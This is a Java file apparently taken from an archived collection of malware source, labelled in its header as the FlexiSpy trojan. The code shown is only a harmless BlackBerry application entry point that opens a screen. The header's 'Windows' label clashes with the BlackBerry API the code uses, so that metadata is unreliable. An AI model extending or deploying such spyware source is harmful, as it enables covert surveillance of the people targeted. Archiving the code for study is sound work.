/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
import net.rim.device.api.ui.UiApplication;

public class PersistentApplicationUI extends UiApplication {
	public static void main(String[] args) {
		PersistentApplicationUI me = new PersistentApplicationUI();
		PersistentApplicationMainScreen appUi = new PersistentApplicationMainScreen(me);
		me.pushScreen(appUi);
		me.enterEventDispatcher();
	}
}
